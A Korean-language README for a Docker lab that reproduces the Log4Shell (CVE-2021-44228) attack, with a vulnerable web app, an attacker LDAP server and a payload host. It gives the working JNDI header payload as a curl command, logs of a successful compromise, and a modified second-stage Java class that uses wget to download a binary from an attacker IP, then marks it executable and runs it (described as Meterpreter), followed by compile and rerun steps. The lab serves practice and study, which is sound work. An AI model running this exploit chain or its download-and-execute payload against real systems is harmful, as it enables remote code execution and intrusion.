# log4shell-dockerlab

## Credits

이 리포에 있는 자료들은 모두 원작자분들의 리포들을 바탕으로 만들어졌습니다. 저는 그저 원작자분들이 만드신 코드를 깃-클론해 docker-compose 했을 뿐입니다. 

- [LunaSec - log4shell 0-day](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [@christophetd - log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)
- [@mbechler - marshalsec](https://github.com/mbechler/marshalsec)
- [@tangxiaofen7 - Exploit.java](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)

## 리포 설명 
이 리포는 CVE-2021-44228, Log4Shell 취약점 공격/방어를 연습하기 위한 리포입니다. 이 리포의 docker-compose 세팅은 공격자 LDAP 서버와 피해자 웹 서버를 만들어줍니다.  

## 구성 

**피해자 웹 서버 - log4shell-vulnerable-app:** log4j 라이브러리를 사용하는 웹서버. Log4shell 의 첫번째 페이로드에 취약한 서버입니다. 

**공격자 LDAP 서버 - marshalsec:** 피해자 서버가 1차 log4shell 페이로드를 통해 JNDI 요청을 할때, 이에 응답하는 LDAP 서버. 피해자 웹 서버를 공격자 웹 서버로 리다이렉트 시킵니다. 

**공격자 웹 서버:** `python3 -m http.server` 로 가동되는 서버이며, 두번째 log4shell 페이로드인 `Exploit.class` 파일을 호스팅합니다.  

## 사용법

피해자 웹 서버와 공격자 웹 서버를 시작합니다.
```
docker-compose up --build 
```

2번째 페이로드를 호스팅하는 공격자 웹 서버를 시작합니다. 이때 8888 포트는 하드코딩 되어있기 때문에 바꾸면 안됩니다. 이를 바꾸려면 `./marshalsec/Dockerfile` 파일 내용을 바꿔줍니다. 
```
cd ./attacker-webserver
python3 -m http.server 8888
```

PoC 공격
```
// Attack with log4shell payload 
└─# curl <your-vm-ip>:8080 -H 'X-Api-Version: ${jndi:ldap://<your-vm-ip>:1389/Exploit}'    

Hello, world!

// Docker-compose's LDAP server replying to JNDI & victim web server downloading Exploit.class from the attacker web server 
log4shell-dockerlab-targetweb-1  |
log4shell-dockerlab-jndi-1       | Send LDAP reference result for Exploit redirecting to http://172.17.0.1:8888/Exploit.class
log4shell-dockerlab-targetweb-1  | 2021-12-12 05:01:44,345 http-nio-8080-exec-7 WARN Error looking up JNDI resource [ldap://192.168.40.128:1389/Exploit]. javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Exploit'
log4shell-dockerlab-targetweb-1  |      at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)

// Attacker's web server sending second stage payload to the victim web server. This will get executed.
└─# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
172.20.0.3 - - [12/Dec/2021 00:01:44] "GET /Exploit.class HTTP/1.1" 200 -
```

PoC 공격 후 결과 확인 
```
// Check docker ps and find out container ID of the "targetweb"
└─# docker ps
CONTAINER ID   IMAGE                           COMMAND                  CREATED             STATUS          PORTS                                       NAMES
1131d694c91a   log4shell-dockerlab_jndi        "/usr/local/bin/mvn-…"   51 minutes ago      Up 51 minutes   0.0.0.0:1389->1389/tcp, :::1389->1389/tcp   log4shell-dockerlab-jndi-1
a2217b3781ad   log4shell-dockerlab_targetweb   "java -jar /app/spri…" 


// Check /tmp and validate the POC have worked 
└─# docker exec a2217b3781ad ls /tmp
hsperfdata_root
log4shell-pwned
```

## 사용법 - 두 번째 페이로드 수정 
PoC로 사용되는 `Exploit.java` 대신, 다른 페이로드를 사용하게끔 수정할 수 있습니다. 

JDK가 설치되어 있지 않다면 설치해줍니다. 
```
apt install -y default-jdk 
```

두 번째 페이로드를 수정합니다. 예를 들어, 메타스플로잇의 `multi/script/web_delivery` 등을 사용할 수 있습니다. 
```
// Modified PoC to ship meterpreter instead of the original echo pwned > /tmp/log4shell-pwned payload. 

public class Rev {
    public Rev() {}
    static {
        try {
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"sh","-c", "wget -qO PqhJT1H2 --no-check-certificate http://192.168.40.128:7777/mhjfufvGzrRws; chmod +x PqhJT1H2; ./PqhJT1H2& disown"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Rev e = new Rev();
    }
} 
```

두 번째 페이로드를 수정한 뒤, 컴파일합니다. `log4shell-vulnerable-app` 이 JDK 8 기반으로 만들어졌기 때문에 꼭 JDK 8에 맞춰서 컴파일 해야합니다. 
```
// Compile with JDK 8
javac --release 8 <your-payload>.java 

// Sanity check and make sure it's version 52.0 (jdk 8)
└─# file Rev.class
Rev.class: compiled Java class data, version 52.0 (Java 1.8)
```

두 번째 페이로드를 호스팅 한 뒤, 다시 공격합니다. 
```
python3 -m http.server 8888 
curl <your-vm-ip>:8080 -H 'X-Api-Version: ${jndi:ldap://<your-vm-ip>:1389/Exploit}'
ex) curl 192.168.40.128:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.40.128:1389/Exploit}'  
```

## 레퍼런스  
https://www.lunasec.io/docs/blog/log4j-zero-day/

http://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228

https://github.com/christophetd/log4shell-vulnerable-app

https://github.com/mbechler/marshalsec

https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
